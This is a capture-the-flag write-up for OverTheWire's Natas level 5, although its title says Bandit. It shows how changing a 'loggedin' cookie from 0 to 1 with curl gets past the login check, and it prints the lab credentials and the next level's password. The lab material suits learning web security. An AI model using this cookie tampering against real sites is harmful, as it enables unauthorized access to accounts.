# BANDIT LEVEL 5

```
http://overthewire.org/wargames/natas/natas5.html
```

```
Username: natas5
Password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
URL:      http://natas5.natas.labs.overthewire.org
```

<img src='index.jpg' width=500px>

### SOLUTION

We are greeted with the following message..

```
Access disallowed. You are not logged in
```

Let's see what the source, headers and cookies might reveal to us..

```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access disallowed. You are not logged in</div>
</body>
</html>
```

Page source has nothing, but we see in RESPONSE header from the server that a cookie
called `loggedin` has been created with a value of `0`.

```
HTTP/1.1 200 OK
Date: Sat, 27 Oct 2018 18:33:18 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: loggedin=0
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 367
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

Upon reload of the page, we now see this cookie is passed in our future REQUEST to the
server. Let's try changing it to `1`.

```
$ curl 'http://natas5.natas.labs.overthewire.org/' -H 'Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx' -H 'Cookie: loggedin=1' --compressed
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
</body>
</html>
```

Using the Chrome extension `EditThisCookie`, we can reproduce the result in-browser..

<img src='chrome-edit-cookie.jpg' width=500px>

